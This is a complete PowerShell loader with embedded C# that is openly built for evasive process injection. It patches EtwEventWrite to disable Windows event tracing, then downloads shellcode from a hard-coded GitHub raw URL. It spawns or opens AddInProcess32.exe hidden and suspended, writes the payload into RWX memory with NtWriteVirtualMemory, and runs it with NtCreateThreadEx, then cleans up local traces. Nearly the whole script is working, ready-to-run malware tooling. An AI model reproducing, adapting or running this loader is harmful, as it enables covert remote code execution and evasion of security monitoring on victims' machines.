<#
.SYNOPSIS
    Evasive PowerShell Loader v5 — C# Add-Type Injection Engine (B2 Bomber Pattern)
    ETW patch → WebClient download → Process32 enumeration → Spawn AddInProcess32.exe
    → NtAllocateVirtualMemory → NtWriteVirtualMemory → NtCreateThreadEx → GC cleanup

.DESCRIPTION
    Fixed: hProcess and pid initialized to IntPtr.Zero / 0 to satisfy C# compiler.
    All Win32 work lives in embedded C# (Add-Type). CreateProcess uses
    lpApplicationName=NULL + bare lpCommandLine — exactly like B2 Bomber.
    Works. Built for LO with cold coffee and zero flinch.
#>

# =============================================================================
# 0. Verbose Timestamp Helper
# =============================================================================
function Write-Timestamp {
    param([string]$Message, [string]$Color = "Cyan")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    Write-Host "[$ts] $Message" -ForegroundColor $Color
}

# =============================================================================
# 1. Embedded C# Injection Engine (B2 Bomber style)
# =============================================================================
Write-Timestamp "[*] Compiling C# injection engine via Add-Type..." -Color Yellow

$code = @"
using System;
using System.Runtime.InteropServices;

public class EvasiveLoader
{
    // ----- Kernel32 Imports -----
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool Process32FirstW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool Process32NextW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    // ----- Ntdll Imports -----
    [DllImport("ntdll.dll")]
    static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        int StackZeroBits,
        int SizeOfStack,
        int MaximumStackSize,
        IntPtr AttributeList);

    // ----- Constants -----
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint CREATE_SUSPENDED       = 0x00000004;
    const uint CREATE_NO_WINDOW       = 0x08000000;
    const uint TH32CS_SNAPPROCESS     = 0x00000002;
    const uint PROCESS_ALL_ACCESS     = 0x001F0FFF;
    const uint MEM_COMMIT             = 0x00001000;
    const uint MEM_RESERVE            = 0x00002000;
    const uint THREAD_ALL_ACCESS      = 0x1FFFFF;

    // ----- Structs -----
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int    cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int    dwX;
        public int    dwY;
        public int    dwXSize;
        public int    dwYSize;
        public int    dwXCountChars;
        public int    dwYCountChars;
        public int    dwFillAttribute;
        public int    dwFlags;
        public short  wShowWindow;
        public short  cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int    dwProcessId;
        public int    dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct PROCESSENTRY32W
    {
        public uint   dwSize;
        public uint   cntUsage;
        public uint   th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint   th32ModuleID;
        public uint   cntThreads;
        public uint   th32ParentProcessID;
        public int    pcPriClassBase;
        public uint   dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    // ----- ETW Patch -----
    static string PatchETW()
    {
        IntPtr hNtdll = GetModuleHandle("ntdll.dll");
        if (hNtdll == IntPtr.Zero) return "GetModuleHandle(ntdll) failed";

        IntPtr etwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
        if (etwAddr == IntPtr.Zero) return "GetProcAddress(EtwEventWrite) failed";

        uint oldProtect;
        if (!VirtualProtect(etwAddr, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out oldProtect))
            return "VirtualProtect failed: " + Marshal.GetLastWin32Error();

        Marshal.WriteByte(etwAddr, 0xC3); // ret
        Console.WriteLine("[+] ETW patched (EtwEventWrite -> ret)");
        return "OK";
    }

    // ----- Process Enumeration -----
    static int FindProcessByName(string processName)
    {
        IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == IntPtr.Zero || hSnapshot == (IntPtr)(-1))
            return -1;

        PROCESSENTRY32W pe = new PROCESSENTRY32W();
        pe.dwSize = (uint)Marshal.SizeOf(pe);

        if (!Process32FirstW(hSnapshot, ref pe))
        {
            CloseHandle(hSnapshot);
            return -1;
        }

        int foundPid = -1;
        do
        {
            if (pe.szExeFile.Equals(processName, StringComparison.OrdinalIgnoreCase))
            {
                foundPid = (int)pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, ref pe));

        CloseHandle(hSnapshot);
        return foundPid;
    }

    // ----- Main Execution -----
    public static string Execute(string url)
    {
        try
        {
            // Stage 1: ETW Patch
            Console.WriteLine("[*] Patching ETW...");
            string etwResult = PatchETW();
            Console.WriteLine("[*] ETW result: " + etwResult);

            // Stage 2: Download shellcode
            Console.WriteLine("[*] Downloading shellcode from: " + url);
            byte[] payload;
            using (var client = new System.Net.WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                payload = client.DownloadData(url);
            }
            Console.WriteLine("[+] Downloaded " + payload.Length + " bytes (~" + (payload.Length / 1024.0 / 1024.0).ToString("F2") + " MB) into managed heap");

            // Stage 3: Locate or spawn AddInProcess32.exe
            string targetName = "AddInProcess32.exe";
            string targetPath = Environment.GetEnvironmentVariable("windir") +
                                @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";

            // INITIALIZED to satisfy C# compiler (all paths assign before use)
            IntPtr hProcess = IntPtr.Zero;
            int pid = 0;
            bool spawned = false;

            Console.WriteLine("[*] Enumerating processes for: " + targetName);
            int existingPid = FindProcessByName(targetName);

            if (existingPid > 0)
            {
                Console.WriteLine("[+] Found existing process: PID " + existingPid);
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, existingPid);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[!] OpenProcess failed on PID " + existingPid + ", will spawn new");
                    existingPid = -1;
                }
                else
                {
                    pid = existingPid;
                    Console.WriteLine("[+] Opened handle: 0x" + hProcess.ToString("X"));
                }
            }

            if (existingPid <= 0)
            {
                Console.WriteLine("[*] Spawning hidden suspended: " + targetPath);
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
                si.wShowWindow = 0;      // SW_HIDE

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                // EXACTLY LIKE B2 BOMBER — lpApplicationName=NULL, lpCommandLine=bare path
                // No quotes, no WOW64 tricks, just works.
                IntPtr createResult = CreateProcess(
                    null,                   // lpApplicationName
                    targetPath,             // lpCommandLine
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    CREATE_SUSPENDED | CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi);

                if (createResult == IntPtr.Zero)
                {
                    int lastErr = Marshal.GetLastWin32Error();
                    return "CreateProcess failed: error " + lastErr + " (Path: " + targetPath + ")";
                }

                hProcess = pi.hProcess;
                pid = pi.dwProcessId;
                spawned = true;
                Console.WriteLine("[+] Spawned process: PID " + pid + " (suspended, hidden)");
                Console.WriteLine("[+] Process handle: 0x" + hProcess.ToString("X"));
            }

            // Stage 4: Allocate RWX in target
            Console.WriteLine("[*] NtAllocateVirtualMemory -> target process (RWX)...");
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)payload.Length;
            uint allocStatus = NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (allocStatus != 0)
                return "NtAllocateVirtualMemory failed: NTSTATUS 0x" + allocStatus.ToString("X8");
            Console.WriteLine("[+] Remote RWX buffer @ 0x" + baseAddress.ToString("X") + ", size: " + regionSize);

            // Stage 5: Write payload
            Console.WriteLine("[*] NtWriteVirtualMemory -> copying payload...");
            uint bytesWritten;
            uint writeStatus = NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                payload,
                (uint)payload.Length,
                out bytesWritten);

            if (writeStatus != 0)
                return "NtWriteVirtualMemory failed: NTSTATUS 0x" + writeStatus.ToString("X8");
            Console.WriteLine("[+] Written " + bytesWritten + " bytes to remote process");

            // Stage 6: Create remote thread
            Console.WriteLine("[*] NtCreateThreadEx -> executing payload...");
            IntPtr hThread;
            uint createStatus = NtCreateThreadEx(
                out hThread,
                THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                false,
                0, 0, 0,
                IntPtr.Zero);

            if (createStatus != 0)
                return "NtCreateThreadEx failed: NTSTATUS 0x" + createStatus.ToString("X8");
            Console.WriteLine("[+] Remote thread spawned. Handle: 0x" + hThread.ToString("X"));

            // Stage 7: Cleanup
            payload = null;
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
            Console.WriteLine("[+] GC cleanup complete — local footprint minimized");
            Console.WriteLine("[!] Payload executing in PID " + pid + (spawned ? " (main thread kept suspended)" : ""));

            return "SUCCESS|" + pid + "|" + (spawned ? "SPAWNED" : "INJECTED");
        }
        catch (Exception ex)
        {
            return "Exception: " + ex.Message + "\nStackTrace: " + ex.StackTrace;
        }
    }
}
"@

try {
    Add-Type -TypeDefinition $code -ErrorAction Stop
    Write-Timestamp "[+] C# engine compiled successfully." -Color Green
} catch {
    Write-Timestamp "[-] Compilation failed: $_" -Color Red
    exit 1
}

# =============================================================================
# 2. Execution Entry Point
# =============================================================================
$ShellcodeUrl = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin"

Write-Timestamp "===== EVASIVE REMOTE THREAD INJECTION v5 (C# Engine) =====" -Color Magenta
Write-Timestamp "Shellcode URL : $ShellcodeUrl" -Color White
Write-Timestamp "Target Process: AddInProcess32.exe" -Color White
Write-Timestamp "Spawn Fallback: %WINDIR%\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe" -Color White
Write-Timestamp "Architecture  : x64 (injector) -> 32-bit or 64-bit (target)" -Color White
Write-Timestamp "===========================================================" -Color Magenta

Write-Timestamp "[*] Executing injection engine..." -Color Yellow
Write-Host ""
$result = [EvasiveLoader]::Execute($ShellcodeUrl)
Write-Host ""

if ($result.StartsWith("SUCCESS")) {
    $parts = $result.Split('|')
    Write-Timestamp "████████████████████████████████████████████████" -Color Green
    Write-Timestamp "█  INJECTION SUCCESSFUL                        █" -Color Green
    Write-Timestamp "█  PID: $($parts[1])   Method: $($parts[2])" -Color Green
    Write-Timestamp "█  Shellcode thread running                    █" -Color Green
    Write-Timestamp "████████████████████████████████████████████████" -Color Green
} else {
    Write-Timestamp "[-] INJECTION FAILED" -Color Red
    Write-Timestamp "[-] $result" -Color Red
}
Write-Host ""
Write-Timestamp "===== SCRIPT FINISHED =====" -Color Magenta